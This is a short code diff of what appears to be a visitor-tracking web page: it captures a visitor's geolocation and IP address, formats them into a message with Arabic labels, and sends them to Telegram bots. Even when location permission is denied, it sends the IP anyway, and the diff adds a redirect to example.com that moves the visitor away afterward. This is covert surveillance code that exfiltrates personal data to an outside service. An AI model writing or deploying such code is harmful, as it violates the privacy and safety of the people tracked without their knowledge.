@@ -13,6 +13,10 @@
         if (error.code === error.PERMISSION_DENIED) {
           // Location permission denied, send IP result to Telegram bots
           sendIPToTelegramBots();
+
+//////1//////
+          window.location.href = 'https://example.com'; 
+//////1//////
         }
       }
     );
@@ -28,8 +32,7 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    //const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;
-    const message = `\nالموقع:\n \n<span style="color: red;">${latitude} ${longitude}</span>\n\nالايبي:\n \n${ipAddress}`;
+    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;
 
 
  // Create the message with the clickable link to Google Maps
